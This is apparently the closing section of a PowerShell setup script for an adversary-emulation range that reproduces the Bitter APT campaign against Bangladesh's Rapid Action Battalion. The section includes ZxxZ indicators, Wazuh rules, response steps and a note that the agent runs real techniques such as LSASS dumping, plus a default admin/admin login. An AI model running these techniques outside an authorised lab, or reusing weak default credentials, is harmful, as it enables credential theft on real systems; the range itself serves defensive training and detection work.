- Scheduled tasks: Rdx, RdxFac
- cURL download: %USERPROFILE%\Music\RdxFactory.exe

## Server files

    server.js            - Express app entry point
    src\                 - server code (db, security, routes, services)
    views\               - Nunjucks templates (lab.html, login.html)
    public\              - static CSS/JS
    agent\               - Python agent for Windows workstations
    data\                - SQLite database (created on first run)
    .env                 - configuration (created from .env.example)
    start.ps1 / stop.ps1 - launcher scripts
    server.out.log / server.err.log - runtime logs

## Ports and Firewall

- The server listens on port 8000. If you need other machines (agents)
  to reach it, allow inbound TCP 8000:
      New-NetFirewallRule -DisplayName "Bitter BD Range 8000" -Direction Inbound -LocalPort 8000 -Protocol TCP -Action Allow

- Change the port by editing APP_PORT in .env.

## Wazuh Rules (BANGLADESH Campaign)

Custom rules 100400-100408 tagged with groups bitter,bangladesh.
Load via the Rule Builder UI or save XML to
/var/ossec/etc/rules/bitter_bangladesh_custom.xml on the Wazuh manager.

## Response Guidance for BANGLADESH

- Notify BGD e-GOV CIRT / Bangladesh National CERT
- Isolate RAB endpoints, rotate RAB officer credentials
- Block C2 domains and IPs at the perimeter
- Hunt for ZxxZ artifacts (%LOCALAPPDATA%\Debug\, Rdx/RdxFac tasks)

## Authorized Lab Use Only

This emulation range executes real TTPs (LSASS dumping, registry modification,
scheduled task creation, etc.) and must only be used in an isolated, dedicated
lab environment with explicit authorization.
'@

# ============================================================
# Run npm install automatically
# ============================================================
if (-not $SkipNpmInstall) {
    $npm = Get-NpmCmd
    if ($npm) {
        Write-Host ""
        Write-Host "Running npm install in $($script:ROOT) ..." -ForegroundColor Cyan
        Write-Host "  (This is a native Windows install - no Docker, no C++ build tools required.)" -ForegroundColor DarkGray
        Push-Location $script:ROOT
        try {
            & $npm.Source install --no-audit --no-fund
            if ($LASTEXITCODE -eq 0) {
                Write-Host "  [+] npm install completed successfully." -ForegroundColor Green
            } else {
                Write-Host "  [!] npm install exited with code $LASTEXITCODE." -ForegroundColor Yellow
                Write-Host "      You can retry manually later with: npm install" -ForegroundColor Yellow
            }
        } catch {
            Write-Host "  [!] npm install failed: $_" -ForegroundColor Yellow
            Write-Host "      Retry manually: cd `"$($script:ROOT)`"; npm install" -ForegroundColor Yellow
        } finally {
            Pop-Location
        }
    } else {
        Write-Host ""
        Write-Host "  [i] Skipping npm install (Node.js/npm not found)." -ForegroundColor Cyan
        Write-Host "      After installing Node.js, run:" -ForegroundColor Cyan
        Write-Host "        cd `"$($script:ROOT)`"" -ForegroundColor Cyan
        Write-Host "        npm install" -ForegroundColor Cyan
    }
}

# ============================================================
# Final banner
# ============================================================
Write-Host ""
Write-Host "============================================================"
Write-Host " DONE - $($script:WN) files created in $($script:ROOT)"
Write-Host " BANGLADESH CAMPAIGN highlighting applied."
Write-Host " NATIVE WINDOWS - NO DOCKER REQUIRED."
Write-Host "============================================================"
Write-Host ""

$hostIp = $null
try {
    $candidates = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' -and $_.PrefixOrigin -ne 'WellKnown' } |
        Sort-Object -Property SkipAsSource | Select-Object -First 1
    if ($candidates) { $hostIp = $candidates.IPAddress }
} catch { }
if (-not $hostIp) { $hostIp = "<this-windows-host-ip>" }

Write-Host " Next steps:" -ForegroundColor Cyan
Write-Host "   cd `"$($script:ROOT)`""

$node = Get-NodeCmd
if ($node) {
    Write-Host "   .\start.ps1" -ForegroundColor Green
} else {
    Write-Host "   # First install Node.js:" -ForegroundColor Yellow
    Write-Host "   winget install --id OpenJS.NodeJS.LTS -e" -ForegroundColor Yellow
    Write-Host "   # Close this window, open a NEW elevated PowerShell, then:" -ForegroundColor Yellow
    Write-Host "   cd `"$($script:ROOT)`"" -ForegroundColor Yellow
    Write-Host "   npm install" -ForegroundColor Yellow
    Write-Host "   .\start.ps1" -ForegroundColor Green
}

Write-Host ""
Write-Host " Then open http://localhost:8000  (or http://${hostIp}:8000 from LAN)" -ForegroundColor White
Write-Host " Login: admin / admin" -ForegroundColor White
Write-Host ""
Write-Host " Copy the agent\ folder to Windows workstations and run:"
Write-Host "   agent\install-agent.bat"
Write-Host "   agent\start-agent.bat        (menu will let you pick the IP)"
Write-Host "   agent\start-agent.bat 192.168.1.50   (non-interactive)"
Write-Host ""
Write-Host " For full realism, run the agent as Administrator." -ForegroundColor Yellow
Write-Host ""
Write-Host " CAMPAIGN: BANGLADESH | Target: Rapid Action Battalion (RAB)" -ForegroundColor Green
Write-Host " Threat Actor: Bitter APT (T-APT-17 / Hazy Tiger)" -ForegroundColor Green
Write-Host " Source: Cisco Talos (May 2022)" -ForegroundColor Green
Write-Host "============================================================"